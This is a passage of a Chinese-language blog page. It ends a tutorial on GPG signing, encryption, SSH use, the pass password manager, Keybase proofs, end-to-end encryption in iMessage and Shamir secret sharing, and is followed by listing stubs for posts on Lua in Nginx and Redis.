class="line">MAsn6CP90pX55V0LnsZGiAgZV+34iFolhFDd7N5mtPT/zF7OToN2SNJF3YOVikBp</span><br><span class="line">M+1WJL9W8x9DwzhOq8AmPgHIEwBZVNS8Nv+UNadIZJuexR0ERl64e8MdTLft0Qui</span><br><span class="line">ChjUiD7ibkLR433jcms+2EJ04xd6Ie0mp/nH5nMLY1mEgHtLMXql6VHQCbJt80Vf</span><br><span class="line">ZrL2J+BF9Sk1zPh9Hn5NGe+RLX1d/CZ62rYMICRcEwiS9vpWq6m9ouSMNZUYr8S5</span><br><span class="line">a/ooD6gc71t457pVgkMqjo3Auazf4PRilUsAraQZilr+8yPhciE/PX3gBL5CtKHJ</span><br><span class="line">4vKH9P9RngigL6D+YyBB5vMcpXlhx9ShbH2qLr106adJ1XrCpGtSmfxygjRn3xX9</span><br><span class="line">Q1dWUaELUahhcdtK6IwZ6qzyp9AESpSd+Z/bnV7jc8iC0VtMOXipVnMo7J5qyHKD</span><br><span class="line">/+yt8/tzoC4+0MEzlaHJ</span><br><span class="line">=aOto</span><br><span class="line">-----END PGP SIGNATURE-----</span><br></pre></td></tr></table></figure>

<p>上面我们先用 SHA1 对要签名的文本进行进行了一下摘要，然后用 GPG 对这个摘要进行了签名。</p>
<p>因为 Git 中的用户名和邮件地址其实是可以随意更改的，之前有过几次伪造 Commit 冒充大 V 的事件发生。最近 GitHub 支持了为帐号配置 GPG 公钥，然后你便可以在发布新版本的时候用 <code>git tag -s v1.0.0</code> 进行签名：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/github-gpg-signature.png"></p>
<p>你可以在本地这样来验证签名，一旦签名认证通过，和正确的 GPG 帐号管理，那么这个 Commit 就不可能是伪造的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~&gt; git tag -v v1.1.0</span><br><span class="line">object b0e42636df7394ac34f2b61c589233d0c3296d10</span><br><span class="line">type commit</span><br><span class="line">tag v1.1.0</span><br><span class="line">tagger jysperm &lt;jysperm@gmail.com&gt; 1467084786 +0800</span><br><span class="line"></span><br><span class="line">gpg: Signature made 6/28 11:33:17 2016 CST</span><br><span class="line">gpg:                using RSA key B40F3AF0E466CF1E</span><br><span class="line">gpg: Good signature from &quot;Wang Ziting &lt;jysperm@gmail.com&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>很多开源软件在发布新版本的二进制包时也会使用 GPG 进行签名，包括 Debian 的软件仓库 apt 也是通过 GPG 进行签名的。</p>
<p>然后你当然也可以用 GPG 加密消息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~&gt; echo &#x27;hello&#x27; | gpg --encrypt -a -r jysperm</span><br><span class="line">-----BEGIN PGP MESSAGE-----</span><br><span class="line"></span><br><span class="line">hQEMAyp325QokoazAQf8DDqELYisLFSGo/9Gblr1MEabb9t3V3AcbWkA4uimpYeD</span><br><span class="line">/DTWDlmxrIsvpmDDeV/1bAZ/gMc2DzhODfM4PQf8DfD+lvHwgMBhe1zSBCZlQwkj</span><br><span class="line">xkP+CtF+S8xWTciaexIMQiTHLNu1tvhvCjIeR1qYJY0/E7tdKhS5iG4Jc3/oyCNN</span><br><span class="line">a1m34O9GG5WJsHozGqpfKZFma50onDmQ6TnSuz4iDWrslvq3XuLRXvgOQ6DKArix</span><br><span class="line">Sxnmxg1kMvlIF6AMmQRHaHpyXBoOlaX/NEsl8ESCe9w4KZFTCoFtsEB9tAwQGeGn</span><br><span class="line">6Tnd7BLaxXOabqaSpoNcOlpWDlZcX89lbewAryKbY9I7AbURsuemI37bTizQUjWA</span><br><span class="line">57xm4t7wTUJ/FLx22Amv1ljUa/Rq84rO8d38EQViNGyo31UmRVXy12AmBDU=</span><br><span class="line">=T42S</span><br><span class="line">-----END PGP MESSAGE-----</span><br></pre></td></tr></table></figure>

<p>这里我们指定了我自己的公钥为收信人，可以看到不同于前面，加密消息没有明文部分，除非使用收信人的私钥，否则无法解密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gpg -d &lt; gpg-message</span><br><span class="line">gpg 2048-bit RSA key, ID 289286B3, created 2016-06-28 (main key ID E466CF1E)</span><br><span class="line">    Wang Ziting &lt;jysperm@gmail.com&gt;</span><br><span class="line">hello</span><br></pre></td></tr></table></figure>

<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>因为 SSH 和 GPG 都支持一样的公钥加密算法（例如 RSA），因此你也可以直接在 SSH 上使用 GPG 的密钥。</p>
<p>例如将你的 GPG 公钥添加到 GitHub，然后使用它来登录 GitHub:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~&gt; export SSH_AUTH_SOCK=~/.gnupg/S.gpg-agent.ssh</span><br><span class="line"></span><br><span class="line">~&gt; ssh-add -l</span><br><span class="line">2048 SHA256:wO93TcTQHZtltKfvS0jewFh0CMj4No6xnTegtB8FN+k</span><br><span class="line"></span><br><span class="line">~&gt; ssh git@github.com</span><br><span class="line">Hi jysperm! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">Connection to github.com closed.</span><br></pre></td></tr></table></figure>

<h2 id="管理密码"><a href="#管理密码" class="headerlink" title="管理密码"></a>管理密码</h2><p>有一个比较有趣的实践是你可以用 gpg 来加密你的密码，<a target="_blank" rel="noopener" href="https://www.passwordstore.org/">pass-store</a> 是一个基于 GPG 和 Git 的非常简单的密码管理器，它可以用 GPG 来加密密码，然后用 Git 来进行版本控制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~&gt; pass find Coding</span><br><span class="line">Search Terms: Coding</span><br><span class="line">└── Code</span><br><span class="line">    └── Coding</span><br><span class="line">        └── jysperm.gpg</span><br><span class="line"></span><br><span class="line">~&gt; pass insert Code/Coding/jysperm</span><br><span class="line"></span><br><span class="line">~&gt; pass show Code/Coding/jysperm</span><br><span class="line">DzizKKVIy22aHQwm</span><br><span class="line"></span><br><span class="line">~&gt; pass git pull --rebase</span><br><span class="line">remote: Counting objects: 11, done.</span><br><span class="line">remote: Total 11 (delta 1), reused 1 (delta 1), pack-reused 10</span><br><span class="line">Unpacking objects: 100% (11/11), done.</span><br><span class="line">From github.com:jysperm/passwords</span><br><span class="line">   5026f34..e94a70f  master     -&gt; origin/master</span><br><span class="line">First, rewinding head to replay your work on top of it...</span><br><span class="line">Fast-forwarded master to e94a70f8b42af5e1c13dd69246b156bbcb24a94c.</span><br></pre></td></tr></table></figure>

<p>这样一来你甚至可以把密码托管在 GitHub 上：<a target="_blank" rel="noopener" href="https://github.com/jysperm/passwords">https://github.com/jysperm/passwords</a></p>
<h2 id="KeyBase-和身份证明"><a href="#KeyBase-和身份证明" class="headerlink" title="KeyBase 和身份证明"></a>KeyBase 和身份证明</h2><p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/keybase-profile.png"></p>
<p>再向大家介绍一个有趣的社区 —— <a target="_blank" rel="noopener" href="https://keybase.io/jysperm">Keybase</a>，它就好像是 GitHub 之于 GPG 社区一样。提供了一个你的 GPG 身份的主页，上面有你的公钥、关联的 GitHub 帐号、Twitter 帐号以及所拥有的网站，他人还可以在这个网页上直接用你的公钥发送经过 GPG 加密的信息。你可以将你的私钥以加密的方式存储在 Keybase（当然不推荐这样做），Keybase 提供了在浏览器中使用密钥对进行加密、解密、签名、验签的功能。</p>
<p>前面我们提到在 Keybase 上你可以关联你的社交帐号，不同于一般的网站的「第三方帐号关联」，Keybase 的用户们显然都对去中心化非常在乎，那么如何去证明一个社交帐号是属于这个 GPG 公钥的呢？在这个场景中我们需要进行两方面的证明，一方面是要用 GPG 公钥去进行一个签名，声明他拥有这个社交帐号：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/twitter-proof-signature.png"></p>
<p>另一方面是用这个社交帐号将这个签名发布出来，来声明他拥有这个 GPG 公钥：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/twitter-proof.png"></p>
<p>这种交叉的证明将不同的数字身份联系到了一起，我觉得这是一个挺有趣的事情，于是我在 KeyBase 之外也自己创建了一个 GPG 主页，并在上面列出了一些和其他数字身份的交叉证明，例如邮件、V2EX 帐号等。我还注册了一个我的 GPG 公钥后八位的域名来指向这个页面：<a target="_blank" rel="noopener" href="http://e466cf1e.pub/">http://E466CF1E.pub</a></p>
<h2 id="端到端加密"><a href="#端到端加密" class="headerlink" title="端到端加密"></a>端到端加密</h2><p>我们再来转向这篇文章的第二个话题「端到端加密」，下图中分别展示了在无加密、SSL 加密和端到端加密的场景下，从 A 到 B、中间经过服务器的一次通讯的过程：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/end-to-end.png"></p>
<p>在没有加密的情况下，消息从 A 到服务器、再到 B 的全程都没有加密。这也意味着数据经过的链路上的任何一个节点（例如运营商的路由器）都可以查看和修改消息的内容，这种情况下的通讯安全是完全没有保证的。</p>
<p>在经过 SSL 加密的情况下，A 和 B 会分别在收发消息前通过 CA 签署的证书去认证服务器的身份，并协商一个用于加密数据的密钥。在从 A 到服务器，或从服务器到 B 的过程中，SSL 会保证数据不被窃听和篡改，但消息在服务器上则是以未加密的形态存在的，服务器可以查看和修改消息的内容，进行一些内容上的审查。</p>
<p>在端到端加密的情况下，消息在从 A 发出之前，就会利用我们前面介绍过的公钥加密技术，使用 B 的公钥进行加密，中间以加密的形式经过服务器和其他路由节点，直到 B 收到消息后，才使用自己的私钥进行解密。这种情况下的服务器并不能查看和修改消息，仅仅作为一个渠道来转发消息。</p>
<p>我们当然可以简单地使用 GPG 加密我们在第三方即时通讯软件上的聊天内容，就像下面这样：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/e2ee-bearychat.png"></p>
<p>但实际上例如 Tox、Line、WhatsApp、iMessage 等 IM 软件，都是默认提供了端到端加密的特性的，我们下面以 iMessage 为例去介绍一个 IM 软件是如何完成端到端加密通讯的。</p>
<p>iMessage 会在每台设备上生成一个 RSA 密钥对用于对数据进行加密，以及一个 ECDSA 密钥对用作签名（它出于安全性和性能的考虑使用了不同的密钥对，但其实是可以用同一个密钥对的）。这些密钥对中的公钥会被上传到 Apple IDS（Identity Services），然后其他用户会从 IDS 中取得你的所有公钥（每个设备一个公钥）。在 iMessage 中发出的所有文字消息都会使用自己的 ECDSA 私钥进行签名，使用对方的每个设备的 RSA 公钥加密一份，通过 APNs 发送给对方。对于多媒体消息，为了减少加密带来的开销，以及加密多份的流量开销，会使用一个临时密钥加密一次，通过 iCloud 进行传输，然后通过前面提到的方式发送临时密钥。苹果的很多应用都使用类似的方式进行端到端加密，包括 iCloud、Facetime、Keychain 等。</p>
<p>但在这个架构中，Apple IDS 依然是一个中心化的单点，它控制了全部的公钥交换过程，而且不允许用户干预。这就意味着 Apple 依然可以在 IDS 上进行中间人攻击，这也印证了我们在一开始提到的，公钥的交换是一个无法绕开的问题。在 GPG 中，用户需要繁琐地完全手动地去建立信任关系，换取了最高的去中心化程度；而在 iMessage 中 IDS 代劳了公钥交换的工作，方便了用户，但也引入了安全风险。</p>
<p>同时群聊也是一个比较难以解决的问题，在 Telegram 中群聊是无法开启端到端加密模式的，在 iMessage 中群聊也不总是可以使用端到端加密。这是因为就像前面提到的多设备的情况一样，在群聊的情况下我们必须用每个人的公钥来加密数据，这样数据在发送端就会膨胀许多倍（而不能发送端只发送一份，由服务器转发），具体的带宽开销会取决于群聊中的人数：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/e2ee-group-chat.png"></p>
<h2 id="保管密钥"><a href="#保管密钥" class="headerlink" title="保管密钥"></a>保管密钥</h2><p>前面我们提到，在密码学账户中，你拥有一个账户的唯一凭证就是你的密钥对，一旦遗失，那么你便没有办法再去控制这个账户；或者一旦泄漏，其他人便拥有和你一样的控制这个账户的能力，无法重置，因此对密钥的保管显得尤为重要。</p>
<p>「备份」是具有两面性的 —— 一方面会让密钥更不容易丢失，但也让密钥变得更加容易泄漏。于是我就有个有趣的想法：能否做到将一个密钥分为若干「片段」保存，仅当拥有其中大部分片段的的时候才能够还原出密钥，但丢失了小部分片段又不影响还原呢？比如将密钥分为 5 份，仅当拥有其中任意三份的情况下可以还原出密钥。于是我找到了一个叫「Shamir’s Secret Sharing」的算法来做到这一点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">~&gt; ssss-split -t 3 -n 5</span><br><span class="line">Generating shares using a (3,5) scheme with dynamic security level.</span><br><span class="line">Enter the secret, at most 128 ASCII characters: my secret root password</span><br><span class="line">Using a 184 bit security level.</span><br><span class="line">1-1c41ef496eccfbeba439714085df8437236298da8dd824</span><br><span class="line">2-fbc74a03a50e14ab406c225afb5f45c40ae11976d2b665</span><br><span class="line">3-fa1c3a9c6df8af0779c36de6c33f6e36e989d0e0b91309</span><br><span class="line">4-468de7d6eb36674c9cf008c8e8fc8c566537ad6301eb9e</span><br><span class="line">5-4756974923c0dce0a55f4774d09ca7a4865f64f56a4ee0</span><br><span class="line"></span><br><span class="line">~&gt; ssss-combine -t 3</span><br><span class="line">Enter 3 shares separated by newlines:</span><br><span class="line">Share [1/3]: 3-fa1c3a9c6df8af0779c36de6c33f6e36e989d0e0b91309</span><br><span class="line">Share [2/3]: 5-4756974923c0dce0a55f4774d09ca7a4865f64f56a4ee0</span><br><span class="line">Share [3/3]: 2-fbc74a03a50e14ab406c225afb5f45c40ae11976d2b665</span><br><span class="line">Resulting secret: my secret root password</span><br></pre></td></tr></table></figure>

<p>但将密钥作为一个文件，尤其是未加密的文件存储在电脑上仍然还是相当不安全的，因为你的电脑上安装了太多乱七八糟的软件了，目前大多数桌面操作系统其实都没有很好的权限控制 —— 几乎所有软件都可以随意地读取你所有的文件。因此 <strong>存储在硬盘上的文件是早晚要泄漏的</strong>，我们应该把密钥存储到一个无法被读取的地方，这就是我们下面要介绍的 TPM 芯片。</p>
<p><img src="https://r2-lc-cn.jysperm.me/thirdparty/gpg-yubikey.jpg"></p>
<p>作为一个芯片来讲，外界必须通过已经被硬件定义好的协议去操作它，而对于 TPM 来讲，它在硬件的设计上就不允许你从芯片中取出私钥，你只能将私钥存进去，或者在 TPM 上生成密钥对。之后和私钥有关的所有运算，包括解密和签名都是在 TPM 芯片上进行的，整个过程中密钥都不会离开 TPM 芯片，即使作为硬件的 TPM 芯片被盗，他人也无法复制芯片中的私钥。</p>
<p>TPM 其实存在与很多笔记本和手机中，iPhone 的存储芯片和指纹识别都是依赖于 TPM 工作的。我目前在使用是的一款叫 Yubikey 的 USB TPM 芯片，它支持 GPG SmartCard 的标准，可以将 GPG 的密钥存储在其中。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
<li>GPG 可以在互联网上，以数学为基础创造一个无法被伪造的身份，并以此身份签名信息、接收加密信息。</li>
<li>GPG 使用去中心化的信任模型，需要自行通过多种渠道来交换公钥，因此不会受制于单一的权威机构。</li>
<li>GPG 提供了身份管理和相互进行「信任签名」的机制来简化密钥的交换过程。</li>
<li>GPG 是一个开放的标准（兼容很多软件和硬件），有着活跃的社区，提供了相对易用的工具来进行公钥加密、解密、签名、验签。</li>
<li>基于公钥加密并签名的端到端加密是从理论上保证通讯安全的唯一方法，但在此之前你需要通过某种方式来交换公钥。</li>
<li>如果私钥丢失就只能改头换面、重新做人了。</li>
</ul>
<h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><ul>
<li><a target="_blank" rel="noopener" href="https://dusted.codes/the-beauty-of-asymmetric-encryption-rsa-crash-course-for-developers">The beauty of asymmetric encryption - RSA crash course for developers</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Comparison_of_instant_messaging_clients#Secure_messengers">Wikipedia: Comparison of instant messaging clients#Secure messengers</a></li>
<li><a target="_blank" rel="noopener" href="http://www.cryptnet.net/fdp/crypto/keysigning_party/en/keysigning_party.html">The Keysigning Party HOWTO</a>（<a target="_blank" rel="noopener" href="https://web.archive.org/web/20070210014944/http://www.cryptnet.net/fdp/crypto/gpg-party/gpg-party.zh-TW.html.euc-tw">繁体中文</a>）</li>
<li><a target="_blank" rel="noopener" href="https://www.apple.com/cn/business/docs/iOS_Security_Guide.pdf">iOS Security Guide</a></li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing">Wikipedia: Shamir’s Secret Sharing</a> <a target="_blank" rel="noopener" href="http://point-at-infinity.org/ssss/">一个开源实现：ssss</a></li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/09/lua-in-nginx/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/lua-in-nginx/" itemprop="url">Lua在Nginx的应用</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-09T13:25:59+00:00">
                2017-09-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/Lua/" itemprop="url" rel="index">
                    <span itemprop="name">Lua</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>当 Nginx 标准模块和配置不能灵活地适应系统要求时，就可以考虑使用 Lua 扩展和定制 Nginx 服务。<a target="_blank" rel="noopener" href="http://openresty.org/en/">OpenResty</a> 集成了大量精良的 Lua 库、第三方模块，可以方便地搭建能够处理超高并发、扩展性极高的 Web 服务，所以这里选择 OpenResty 提供的 <a target="_blank" rel="noopener" href="https://github.com/openresty/lua-nginx-module">lua-nginx-module</a> 方案。</p>
<p><img src="//www.fanhaobai.com/2017/09/lua-in-nginx/63113174-45d7-4a27-8472-d037675c2cbd.jpg">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/09/lua-in-nginx/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/speaking-alicante-frontend">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/speaking-alicante-frontend" itemprop="url">Speaking at Alicante Frontend</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-09T00:00:00+00:00">
                2017-09-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          I have presented a talk at Alicante Frontend, a meetup about web development in Spain.
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/speaking-alicante-frontend">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/8%E3%8E%A1%E5%87%BA%E7%A7%9F%E6%88%BF100%E5%85%83%E5%B0%8F%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95-90%E5%90%8E%E6%9D%AD%E6%BC%82%E7%A8%8B%E5%BA%8F%E5%91%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/8%E3%8E%A1%E5%87%BA%E7%A7%9F%E6%88%BF100%E5%85%83%E5%B0%8F%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95-90%E5%90%8E%E6%9D%AD%E6%BC%82%E7%A8%8B%E5%BA%8F%E5%91%98/" itemprop="url">8㎡出租房100元小折腾记录--90后杭漂程序员</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-08T11:57:59+00:00">
                2017-09-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>都说房子是租的，但生活不是。同步更新至 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/29193378">知乎专栏文章</a></p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/8%E3%8E%A1%E5%87%BA%E7%A7%9F%E6%88%BF100%E5%85%83%E5%B0%8F%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95-90%E5%90%8E%E6%9D%AD%E6%BC%82%E7%A8%8B%E5%BA%8F%E5%91%98/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/09/lua-in-redis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/lua-in-redis/" itemprop="url">Lua在Redis的应用</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-04T13:50:19+00:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/Lua/" itemprop="url" rel="index">
                    <span itemprop="name">Lua</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>Redis 从 2.6 版本起，也已开始支持 <a target="_blank" rel="noopener" href="https://redis.io/commands/eval">Lua 脚本</a>，我们可以更加得心应手地使用或扩展 Redis，特别是在高并发场景下 Lua 脚本提供了更高效、可靠的解决方案。</p>
<p><img src="//www.fanhaobai.com/2017/09/lua-in-redis/3916d13312c22d84d29d3860b59544a9.png">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/09/lua-in-redis/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/09/lua/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
